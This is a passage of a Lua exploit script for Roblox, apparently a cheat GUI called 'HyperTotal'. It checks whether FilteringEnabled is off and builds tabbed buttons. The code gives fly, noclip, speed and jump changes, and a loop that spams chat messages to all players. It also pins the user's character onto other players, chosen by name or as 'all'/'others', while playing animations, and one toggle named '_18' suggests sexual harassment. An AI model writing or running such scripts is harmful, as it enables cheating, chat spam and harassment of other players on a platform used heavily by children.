		Local_PlayerTAB.TextWrapped = true
		ExtraTAB.Name = "ExtraTAB"
		ExtraTAB.Parent = SelectTabs
		ExtraTAB.BackgroundColor3 = Color3.new(1, 1, 1)
		ExtraTAB.BackgroundTransparency = 1
		ExtraTAB.Position = UDim2.new(0, 0, 0.850000024, 0)
		ExtraTAB.Size = UDim2.new(0, 82, 0, 40)
		ExtraTAB.Font = Enum.Font.SourceSansLight
		ExtraTAB.FontSize = Enum.FontSize.Size24
		ExtraTAB.Text = "Extra"
		ExtraTAB.TextSize = 20
		ExtraTAB.TextWrapped = true
		SideFrame.Name = "SideFrame"
		SideFrame.Parent = HyperTotal
		SideFrame.Active = true
		SideFrame.BackgroundColor3 = Color3.new(1, 1, 1)
		SideFrame.BackgroundTransparency = 1
		SideFrame.Draggable = true
		SideFrame.Position = UDim2.new(0.349, 0, 0.25, 0)
		SideFrame.Size = UDim2.new(0, 350, 0, 40)
		SideFrame.Visible = false
		SideTopFrame.Name = "SideTopFrame"
		SideTopFrame.Parent = SideFrame
		SideTopFrame.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
		SideTopFrame.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
		SideTopFrame.BorderSizePixel = 2
		SideTopFrame.Position = UDim2.new(-0.287, 0, 0, 0)
		SideTopFrame.Size = UDim2.new(0, 450, 0, 270)
		SideTopFrame.ZIndex = 9
		SideTitle.Name = "SideTitle"
		SideTitle.Parent = SideTopFrame
		SideTitle.BackgroundColor3 = Color3.new(1, 1, 1)
		SideTitle.BackgroundTransparency = 1
		SideTitle.Position = UDim2.new(0.356534153, 0, 0, 0)
		SideTitle.Size = UDim2.new(0, 150, 0, 40)
		SideTitle.ZIndex = 10
		SideTitle.Font = Enum.Font.SourceSansItalic
		SideTitle.FontSize = Enum.FontSize.Size36
		SideTitle.Text = "HyperTotal"
		SideTitle.TextColor3 = Color3.new(0.933333, 0.670588, 0.0509804)
		SideTitle.TextSize = 35
		SideTitle.TextWrapped = true
		OpenGUI.Name = "OpenGUI"
		OpenGUI.Parent = SideTopFrame
		OpenGUI.BackgroundColor3 = Color3.new(1, 1, 1)
		OpenGUI.BackgroundTransparency = 1
		OpenGUI.Position = UDim2.new(0.913618803, 0, 0, 0)
		OpenGUI.Size = UDim2.new(0, 40, 0, 40)
		OpenGUI.ZIndex = 10
		OpenGUI.Font = Enum.Font.SourceSansBold
		OpenGUI.FontSize = Enum.FontSize.Size60
		OpenGUI.Text = "X"
		OpenGUI.TextColor3 = Color3.new(1, 0.631373, 0.109804)
		OpenGUI.TextSize = 50
		OpenGUI.TextWrapped = true
		SideCreditTXT.Name = "SideCreditTXT"
		SideCreditTXT.Parent = SideTopFrame
		SideCreditTXT.BackgroundColor3 = Color3.new(1, 1, 1)
		SideCreditTXT.BackgroundTransparency = 1
		SideCreditTXT.Position = UDim2.new(0.690784931, 0, 0.250416666, 0)
		SideCreditTXT.Rotation = -17
		SideCreditTXT.Size = UDim2.new(0, 90, 0, 20)
		SideCreditTXT.ZIndex = 10
		SideCreditTXT.Font = Enum.Font.SourceSansItalic
		SideCreditTXT.FontSize = Enum.FontSize.Size24
		SideCreditTXT.Text = "illremember"
		SideCreditTXT.TextColor3 = Color3.new(0.933333, 0.819608, 0.737255)
		SideCreditTXT.TextSize = 20
		SideCreditTXT.TextWrapped = true
		BrickFrame.Name = "BrickFrame"
		BrickFrame.Parent = MainFrame
		BrickFrame.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
		BrickFrame.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
		BrickFrame.BorderSizePixel = 0
		BrickFrame.Position = UDim2.new(0, 0, 0.148395061, 0)
		BrickFrame.Size = UDim2.new(0, 0, 0, 230)
		BrickFrame.ZIndex = 4

-- Buttons
		col = Color3.new(0.854902, 0.854902, 0.854902)
		loc = Color3.new(0.65, 0.90, 0.65)
		wait(1)
		MainFrame:TweenPosition(UDim2.new(0.348623842, 0, 0.25, 0), "Out", "Bounce", 2)
		if game.Workspace.FilteringEnabled == false then
			FE_CHECK.Text = "FE is disabled"
			FE_CHECK.TextColor3 = Color3.fromRGB(200, 10, 10)
		else
			FE_CHECK.Text = "FE is enabled"
			FE_CHECK.TextColor3 = Color3.fromRGB(10, 200, 10)
		end
		CloseGUI.MouseButton1Click:connect(function()
			CloseGUI.Visible = false
			EnterUsername.Visible = false
			TopFrame:TweenSize(UDim2.new(0, 450, 0, 270), "Out", "Sine", 1)
			wait(1)
			SideFrame.Position = MainFrame.Position
			MainFrame.Visible = false
			SideFrame.Visible = true
			SideTopFrame:TweenSize(UDim2.new(0, 450, 0, 40), "Out", "Sine", 1)
			OpenGUI.Visible = false
			wait(1)
			OpenGUI.Visible = true
		end)
		OpenGUI.MouseButton1Click:connect(function()
			OpenGUI.Visible = false
			SideTopFrame:TweenSize(UDim2.new(0, 450, 0, 270), "Out", "Sine", 1)
			wait(1)
			MainFrame.Position = SideFrame.Position
			SideFrame.Visible = false
			MainFrame.Visible = true
			CloseGUI.Visible = false
			TopFrame:TweenSize(UDim2.new(0, 450, 0, 40), "Out", "Sine", 1)
			wait(1)
			EnterUsername.Visible = true
			CloseGUI.Visible = true
		end)
		AnimationsTAB.MouseButton1Click:connect(function()
			BrickFrame:TweenSize(UDim2.new(0, 350, 0, 230), "Out", "Sine", 0.5)
			wait(0.5)
			Animations.Visible = true
			Basic.Visible = false
			Extra.Visible = false
			INTRO.Visible = false
			Local_Player.Visible = false
			RocketPropulsion.Visible = false
			Teleportation.Visible = false
			Tools.Visible = false
			AnimationsTAB.Font = "SourceSansBold"
			BasicTAB.Font = "SourceSansLight"
			ExtraTAB.Font = "SourceSansLight"
			Local_PlayerTAB.Font = "SourceSansLight"
			RocketPropulsionTAB.Font = "SourceSansLight"
			TeleportationTAB.Font = "SourceSansLight"
			ToolsTAB.Font = "SourceSansLight"
			AnimationsTAB.TextSize = 17
			TeleportationTAB.TextSize = 17
			BrickFrame:TweenSize(UDim2.new(0, 0, 0, 230), "Out", "Sine", 0.5)
		end)
		BasicTAB.MouseButton1Click:connect(function()
			BrickFrame:TweenSize(UDim2.new(0, 350, 0, 230), "Out", "Sine", 0.5)
			wait(0.5)
			Animations.Visible = false
			Basic.Visible = true
			Extra.Visible = false
			INTRO.Visible = false
			Local_Player.Visible = false
			RocketPropulsion.Visible = false
			Teleportation.Visible = false
			Tools.Visible = false
			AnimationsTAB.Font = "SourceSansLight"
			BasicTAB.Font = "SourceSansBold"
			ExtraTAB.Font = "SourceSansLight"
			Local_PlayerTAB.Font = "SourceSansLight"
			RocketPropulsionTAB.Font = "SourceSansLight"
			TeleportationTAB.Font = "SourceSansLight"
			ToolsTAB.Font = "SourceSansLight"
			AnimationsTAB.TextSize = 20
			TeleportationTAB.TextSize = 17
			BrickFrame:TweenSize(UDim2.new(0, 0, 0, 230), "Out", "Sine", 0.5)
		end)
		ExtraTAB.MouseButton1Click:connect(function()
			BrickFrame:TweenSize(UDim2.new(0, 350, 0, 230), "Out", "Sine", 0.5)
			wait(0.5)
			Animations.Visible = false
			Basic.Visible = false
			Extra.Visible = true
			INTRO.Visible = false
			Local_Player.Visible = false
			RocketPropulsion.Visible = false
			Teleportation.Visible = false
			Tools.Visible = false
			AnimationsTAB.Font = "SourceSansLight"
			BasicTAB.Font = "SourceSansLight"
			ExtraTAB.Font = "SourceSansBold"
			Local_PlayerTAB.Font = "SourceSansLight"
			RocketPropulsionTAB.Font = "SourceSansLight"
			TeleportationTAB.Font = "SourceSansLight"
			ToolsTAB.Font = "SourceSansLight"
			AnimationsTAB.TextSize = 20
			TeleportationTAB.TextSize = 17
			BrickFrame:TweenSize(UDim2.new(0, 0, 0, 230), "Out", "Sine", 0.5)
		end)
		Local_PlayerTAB.MouseButton1Click:connect(function()
			BrickFrame:TweenSize(UDim2.new(0, 350, 0, 230), "Out", "Sine", 0.5)
			wait(0.5)
			Animations.Visible = false
			Basic.Visible = false
			Extra.Visible = false
			INTRO.Visible = false
			Local_Player.Visible = true
			RocketPropulsion.Visible = false
			Teleportation.Visible = false
			Tools.Visible = false
			AnimationsTAB.Font = "SourceSansLight"
			BasicTAB.Font = "SourceSansLight"
			ExtraTAB.Font = "SourceSansLight"
			Local_PlayerTAB.Font = "SourceSansBold"
			RocketPropulsionTAB.Font = "SourceSansLight"
			TeleportationTAB.Font = "SourceSansLight"
			ToolsTAB.Font = "SourceSansLight"
			AnimationsTAB.TextSize = 20
			TeleportationTAB.TextSize = 17
			BrickFrame:TweenSize(UDim2.new(0, 0, 0, 230), "Out", "Sine", 0.5)
		end)
		RocketPropulsionTAB.MouseButton1Click:connect(function()
			BrickFrame:TweenSize(UDim2.new(0, 350, 0, 230), "Out", "Sine", 0.5)
			wait(0.5)
			Animations.Visible = false
			Basic.Visible = false
			Extra.Visible = false
			INTRO.Visible = false
			Local_Player.Visible = false
			RocketPropulsion.Visible = true
			Teleportation.Visible = false
			Tools.Visible = false
			AnimationsTAB.Font = "SourceSansLight"
			BasicTAB.Font = "SourceSansLight"
			ExtraTAB.Font = "SourceSansLight"
			Local_PlayerTAB.Font = "SourceSansLight"
			RocketPropulsionTAB.Font = "SourceSansBold"
			TeleportationTAB.Font = "SourceSansLight"
			ToolsTAB.Font = "SourceSansLight"
			AnimationsTAB.TextSize = 20
			TeleportationTAB.TextSize = 17
			BrickFrame:TweenSize(UDim2.new(0, 0, 0, 230), "Out", "Sine", 0.5)
		end)
		TeleportationTAB.MouseButton1Click:connect(function()
			BrickFrame:TweenSize(UDim2.new(0, 350, 0, 230), "Out", "Sine", 0.5)
			wait(0.5)
			Animations.Visible = false
			Basic.Visible = false
			Extra.Visible = false
			INTRO.Visible = false
			Local_Player.Visible = false
			RocketPropulsion.Visible = false
			Teleportation.Visible = true
			Tools.Visible = false
			AnimationsTAB.Font = "SourceSansLight"
			BasicTAB.Font = "SourceSansLight"
			ExtraTAB.Font = "SourceSansLight"
			Local_PlayerTAB.Font = "SourceSansLight"
			RocketPropulsionTAB.Font = "SourceSansLight"
			TeleportationTAB.Font = "SourceSansBold"
			ToolsTAB.Font = "SourceSansLight"
			AnimationsTAB.TextSize = 20
			TeleportationTAB.TextSize = 15
			BrickFrame:TweenSize(UDim2.new(0, 0, 0, 230), "Out", "Sine", 0.5)
		end)
		ToolsTAB.MouseButton1Click:connect(function()
			BrickFrame:TweenSize(UDim2.new(0, 350, 0, 230), "Out", "Sine", 0.5)
			wait(0.5)
			Animations.Visible = false
			Basic.Visible = false
			Extra.Visible = false
			INTRO.Visible = false
			Local_Player.Visible = false
			RocketPropulsion.Visible = false
			Teleportation.Visible = false
			Tools.Visible = true
			AnimationsTAB.Font = "SourceSansLight"
			BasicTAB.Font = "SourceSansLight"
			ExtraTAB.Font = "SourceSansLight"
			Local_PlayerTAB.Font = "SourceSansLight"
			RocketPropulsionTAB.Font = "SourceSansLight"
			TeleportationTAB.Font = "SourceSansLight"
			ToolsTAB.Font = "SourceSansBold"
			AnimationsTAB.TextSize = 20
			TeleportationTAB.TextSize = 17
			BrickFrame:TweenSize(UDim2.new(0, 0, 0, 230), "Out", "Sine", 0.5)
		end)

------ ANIMATIONS -------------------------------------------------------------------------
------ ANIMATIONS -------------------------------------------------------------------------
------ ANIMATIONS -------------------------------------------------------------------------
------ ANIMATIONS -------------------------------------------------------------------------
		function GetPlayer(String) -- Credit to Timeless/xFunnieuss
			local Found = {}
			local strl = String:lower()
			if strl == "all" then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					table.insert(Found, v)
				end
			elseif strl == "others" then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					if v.Name ~= game:GetService("Players").LocalPlayer.Name then
						table.insert(Found, v)
					end
				end
			else
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					if v.Name:lower():sub(1, #String) == String:lower() then
						table.insert(Found, v)
					end
				end
			end
			return Found
		end
		AnimationId = "148840371"
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://" .. AnimationId
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		_18active = false
		game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
			track = character:WaitForChild("Humanoid"):LoadAnimation(Anim)
			_18active = false
		end)
		_18.MouseButton1Click:connect(function()
			_18active = not _18active
			if _18active then
				_18.BackgroundColor3 = loc
				for i, v in pairs(GetPlayer(EnterUsername.Text)) do
					track:Play()
					game:GetService('RunService').Stepped:connect(function()
						if _18active then
							game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
						end
					end)
				end
			else
				track:Stop()
				_18.BackgroundColor3 = col
			end
		end)
		AnimationId = "282574440"
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://" .. AnimationId
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		CarpetActive = false
		game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
			track = character:WaitForChild("Humanoid"):LoadAnimation(Anim)
			CarpetActive = false
		end)
		Carpet.MouseButton1Click:connect(function()
			CarpetActive = not CarpetActive
			if CarpetActive then
				Carpet.BackgroundColor3 = loc
				for i, v in pairs(GetPlayer(EnterUsername.Text)) do
					track:Play()
					game:GetService('RunService').Stepped:connect(function()
						if CarpetActive then
							game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
						end
					end)
				end
			else
				track:Stop()
				Carpet.BackgroundColor3 = col
			end
		end)
		AnimationId = "215384594"
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://" .. AnimationId
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		ExperimentalAnimationActive = false
		game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
			track = character:WaitForChild("Humanoid"):LoadAnimation(Anim)
			ExperimentalAnimationActive = false
		end)
		ExperimentalAnimation.MouseButton1Click:connect(function()
			ExperimentalAnimationActive = not ExperimentalAnimationActive
			if ExperimentalAnimationActive then
				ExperimentalAnimation.BackgroundColor3 = loc
				for i, v in pairs(GetPlayer(EnterUsername.Text)) do
					track:Play(0.1, 1, 5)
					game:GetService('RunService').Stepped:connect(function()
						if ExperimentalAnimationActive then
							game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
						end
					end)
				end
			else
				track:Stop()
				ExperimentalAnimation.BackgroundColor3 = col
			end
		end)
		AnimationId = "429703734"
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://" .. AnimationId
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		DanceActive = false
		game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
			track = character:WaitForChild("Humanoid"):LoadAnimation(Anim)
			DanceActive = false
		end)
		Dance.MouseButton1Click:connect(function()
			DanceActive = not DanceActive
			if DanceActive then
				Dance.BackgroundColor3 = loc
				for i, v in pairs(GetPlayer(EnterUsername.Text)) do
					track:Play()
					game:GetService('RunService').Stepped:connect(function()
						if DanceActive then
							game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
						end
					end)
				end
			else
				track:Stop()
				Dance.BackgroundColor3 = col
			end
		end)
		AnimationId = "282574440"
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://" .. AnimationId
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		HideActive = false
		game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
			track = character:WaitForChild("Humanoid"):LoadAnimation(Anim)
			HideActive = false
		end)
		Hide.MouseButton1Click:connect(function()
			HideActive = not HideActive
			if HideActive then
				Hide.BackgroundColor3 = loc
				for i, v in pairs(GetPlayer(EnterUsername.Text)) do
					track:Play()
					game:GetService('RunService').Stepped:connect(function()
						if HideActive then
							game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.Head.CFrame
						end
					end)
				end
			else
				track:Stop()
				Hide.BackgroundColor3 = col
			end
		end)
		AnimationId = "313762630"
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://" .. AnimationId
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		LevitateOnActive = false
		game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
			track = character:WaitForChild("Humanoid"):LoadAnimation(Anim)
			LevitateOnActive = false
		end)
		LevitateOn.MouseButton1Click:connect(function()
			LevitateOnActive = not LevitateOnActive
			if LevitateOnActive then
				LevitateOn.BackgroundColor3 = loc
				for i, v in pairs(GetPlayer(EnterUsername.Text)) do
					track:Play()
					game:GetService('RunService').Stepped:connect(function()
						if LevitateOnActive then
							game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
						end
					end)
				end
			else
				track:Stop()
				LevitateOn.BackgroundColor3 = col
			end
		end)
		AnimationId = "215384594"
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://" .. AnimationId
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		PushLockActive = false
		game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
			track = character:WaitForChild("Humanoid"):LoadAnimation(Anim)
			PushLockActive = false
		end)
		PushLock.MouseButton1Click:connect(function()
			PushLockActive = not PushLockActive
			if PushLockActive then
				PushLock.BackgroundColor3 = loc
				for i, v in pairs(GetPlayer(EnterUsername.Text)) do
					track:Play()
					game:GetService('RunService').Stepped:connect(function()
						if PushLockActive then
							game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
						end
					end)
				end
			else
				track:Stop()
				PushLock.BackgroundColor3 = col
			end
		end)
		AnimationId = "184574340"
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://" .. AnimationId
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		SlamOnActive = false
		game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
			track = character:WaitForChild("Humanoid"):LoadAnimation(Anim)
			SlamOnActive = false
		end)
		SlamOn.MouseButton1Click:connect(function()
			SlamOnActive = not SlamOnActive
			if SlamOnActive then
				SlamOn.BackgroundColor3 = loc
				for i, v in pairs(GetPlayer(EnterUsername.Text)) do
					track:Play()
					game:GetService('RunService').Stepped:connect(function()
						if SlamOnActive then
							game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
						end
					end)
				end
			else
				track:Stop()
				SlamOn.BackgroundColor3 = col
			end
		end)

------ BASIC -------------------------------------------------------------------------
------ BASIC -------------------------------------------------------------------------
------ BASIC -------------------------------------------------------------------------
------ BASIC -------------------------------------------------------------------------
		HipHeight.MouseButton1Click:connect(function()
			game:GetService("Players").LocalPlayer.Character.Humanoid.HipHeight = STATCHANGE.Text
		end)
		JumpHeight.MouseButton1Click:connect(function()
			game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = STATCHANGE.Text
		end)
		Speed.MouseButton1Click:connect(function()
			game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = STATCHANGE.Text
		end)
		Chat.MouseButton1Click:connect(function()
			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(CHATBOX.Text, "All")
		end)
		keepspam = false
		Spam.MouseButton1Click:connect(function()
			keepspam = not keepspam
			if keepspam then
				Spam.BackgroundColor3 = loc
			else
				Spam.BackgroundColor3 = col
			end
			while wait(0.5) do
				if keepspam then
					game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(CHATBOX.Text, "All")
				end
			end
		end)
		clip = true
		Noclip.MouseButton1Click:connect(function()
			clip = not clip
			game:GetService('RunService').Stepped:connect(function()
				if not clip then
					Noclip.BackgroundColor3 = loc
					game:GetService("Players").LocalPlayer.Character.Head.CanCollide = false
					game:GetService("Players").LocalPlayer.Character.Torso.CanCollide = false
					game:GetService("Players").LocalPlayer.Character["Left Leg"].CanCollide = false
					game:GetService("Players").LocalPlayer.Character["Right Leg"].CanCollide = false
				else
					Noclip.BackgroundColor3 = col
				end
			end)
		end)
		local flying = false
		Fly.MouseButton1Click:connect(function()
			flying = not flying
			repeat
				wait()
			until game:GetService("Players").LocalPlayer and game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:findFirstChild("Torso") and game:GetService("Players").LocalPlayer.Character:findFirstChild("Humanoid")
			local mouse = game:GetService("Players").LocalPlayer:GetMouse()
			repeat
				wait()
			until mouse
			local plr = game:GetService("Players").LocalPlayer
			local torso = plr.Character.Torso
			local deb = true
			local ctrl = {
				f = 0,
				b = 0,
				l = 0,
				r = 0
			}
			local lastctrl = {
				f = 0,
				b = 0,
				l = 0,
				r = 0
			}
			local maxspeed = 70
			local speed = 0
			if flying then
				Fly.BackgroundColor3 = loc
			else
				Fly.BackgroundColor3 = col
			end
			function FlyFunction()
				local bg = Instance.new("BodyGyro", torso)
				bg.P = 9e4
				bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
				bg.cframe = torso.CFrame
				local bv = Instance.new("BodyVelocity", torso)
				bv.velocity = Vector3.new(0, 0.1, 0)
				bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
				repeat
					wait()
					plr.Character.Humanoid.PlatformStand = true
					if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
						speed = speed + .5 + (speed / maxspeed)
						if speed > maxspeed then
							speed = maxspeed
						end
					elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
						speed = speed - 1
						if speed < 0 then
							speed = 0
						end
					end
					if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
						bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f + ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l + ctrl.r, (ctrl.f + ctrl.b) * .2, 0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p)) * speed
						lastctrl = {
							f = ctrl.f,
							b = ctrl.b,
							l = ctrl.l,
							r = ctrl.r
						}
					elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
						bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f + lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l + lastctrl.r, (lastctrl.f + lastctrl.b) * .2, 0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p)) * speed
					else
						bv.velocity = Vector3.new(0, 0.1, 0)
					end
					bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f + ctrl.b) * 50 * speed / maxspeed), 0, 0)
				until not flying
				ctrl = {
					f = 0,
					b = 0,
					l = 0,
					r = 0
				}
				lastctrl = {
					f = 0,
					b = 0,
					l = 0,
					r = 0
				}
				speed = 0
				bg:Destroy()
				bv:Destroy()
				plr.Character.Humanoid.PlatformStand = false
			end
			mouse.KeyDown:connect(function(key)
				if key:lower() == "w" then
					ctrl.f = 1
				elseif key:lower() == "s" then
					ctrl.b = -1
				elseif key:lower() == "a" then
					ctrl.l = -1
				elseif key:lower() == "d" then
					ctrl.r = 1
				end
			end)
			mouse.KeyUp:connect(function(key)
				if key:lower() == "w" then
					ctrl.f = 0
				elseif key:lower() == "s" then
					ctrl.b = 0
				elseif key:lower() == "a" then
					ctrl.l = 0
				elseif key:lower() == "d" then
					ctrl.r = 0
				end
			end)
			FlyFunction()
		end)

------ EXTRA -------------------------------------------------------------------------
------ EXTRA -------------------------------------------------------------------------
------ EXTRA -------------------------------------------------------------------------
------ EXTRA -------------------------------------------------------------------------
		frost = false
		Freeze.MouseButton1Click:connect(function()
			frost = not frost
			if frost then
				game:GetService("Players").LocalPlayer.Character.Torso.Anchored = true
				game:GetService("Players").LocalPlayer.Character.Head.Anchored = true
				game:GetService("Players").LocalPlayer.Character["Left Leg"].Anchored = true
				game:GetService("Players").LocalPlayer.Character["Left Arm"].Anchored = true
				game:GetService("Players").LocalPlayer.Character["Right Leg"].Anchored = true
				game:GetService("Players").LocalPlayer.Character["Right Arm"].Anchored = true
				Freeze.BackgroundColor3 = loc
			else
				game:GetService("Players").LocalPlayer.Character.Torso.Anchored = false
				game:GetService("Players").LocalPlayer.Character.Head.Anchored = false
				game:GetService("Players").LocalPlayer.Character["Left Leg"].Anchored = false
				game:GetService("Players").LocalPlayer.Character["Left Arm"].Anchored = false
				game:GetService("Players").LocalPlayer.Character["Right Leg"].Anchored = false
				game:GetService("Players").LocalPlayer.Character["Right Arm"].Anchored = false
				Freeze.BackgroundColor3 = col
			end
		end)
		insanity = false
		local Anim = Instance.new("Animation")
		AnimationId = "33796059"
		Anim.AnimationId = "rbxassetid://" .. AnimationId
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
			track = character:WaitForChild("Humanoid"):LoadAnimation(Anim)
			insanity = false
		end)
		Insane.MouseButton1Down:connect(function()
			insanity = not insanity
			if insanity then
				track:Play(0.1, 1, 999)
				Insane.BackgroundColor3 = loc
			else
				track:Stop()
				Insane.BackgroundColor3 = col
			end
		end)
		Sit.MouseButton1Click:connect(function()
			game:GetService("Players").LocalPlayer.Character.Humanoid.Sit = true
		end)
		Jump.MouseButton1Click:connect(function()
			game:GetService("Players").LocalPlayer.Character.Humanoid.Jump = true
		end)
		platform = false
		PlatformStand.MouseButton1Click:connect(function()
			platform = not platform
			if platform then
				game:GetService("Players").LocalPlayer.Character.Humanoid.PlatformStand = true
				PlatformStand.BackgroundColor3 = loc
			else
				game:GetService("Players").LocalPlayer.Character.Humanoid.PlatformStand = false
				PlatformStand.BackgroundColor3 = col
			end
		end)
		TPVoid.MouseButton1Click:connect(function()
			game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(math.huge, math.huge, math.huge)
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://204295235"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		question = false
		game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
			track = character:WaitForChild("Humanoid"):LoadAnimation(Anim)
			question = false
		end)
		Unknown.MouseButton1Click:connect(function()
			question = not question
			if question then
				Unknown.BackgroundColor3 = loc
				while wait do
					if track.IsPlaying == false then
						if question then
							track:Play(0.1, 1, 1e5)
						end
					end
				end
			else
				Unknown.BackgroundColor3 = col
				track:Stop()
			end
		end)
		Reset.MouseButton1Click:connect(function()
			game:GetService("Players").LocalPlayer.Character.Head:Destroy()
		end)

------ LOCALPLAYER -------------------------------------------------------------------------
------ LOCALPLAYER -------------------------------------------------------------------------
------ LOCALPLAYER -------------------------------------------------------------------------
------ LOCALPLAYER -------------------------------------------------------------------------
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://215384594"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local CloneIllusionACTIVE = false
		game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
			track = character:WaitForChild("Humanoid"):LoadAnimation(Anim)
			CloneIllusionACTIVE = false
		end)
		CloneIllusion.MouseButton1Click:connect(function()
			CloneIllusionACTIVE = not CloneIllusionACTIVE
			if CloneIllusionACTIVE then
				track:Play(.5, 1, 1e7)
				CloneIllusion.BackgroundColor3 = loc
			else
				track:Stop()
				CloneIllusion.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://204328711"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local DinoWalkACTIVE = false
		game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
			track = character:WaitForChild("Humanoid"):LoadAnimation(Anim)
			DinoWalkACTIVE = false
		end)
		Dinosaur.MouseButton1Click:connect(function()
			DinoWalkACTIVE = not DinoWalkACTIVE
			if DinoWalkACTIVE then
				track:Play(.1, 1, 1)
				Dinosaur.BackgroundColor3 = loc
				game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = 30
				game:GetService("Players").LocalPlayer.Character.Humanoid.JumpHeight = 200
			else
				track:Stop()
				Dinosaur.BackgroundColor3 = col
				game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = 16
				game:GetService("Players").LocalPlayer.Character.Humanoid.JumpHeight = 50
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://313762630"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local GlitchLevitateACTIVE = false
		game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
			track = character:WaitForChild("Humanoid"):LoadAnimation(Anim)
			GlitchLevitateACTIVE = false
		end)
		Glitchy.MouseButton1Click:connect(function()
			GlitchLevitateACTIVE = not GlitchLevitateACTIVE
			if GlitchLevitateACTIVE then
				track:Play(.5, 1, 1e7)
				Glitchy.BackgroundColor3 = loc
			else
				track:Stop()
				Glitchy.BackgroundColor3 = col
			end
		end)
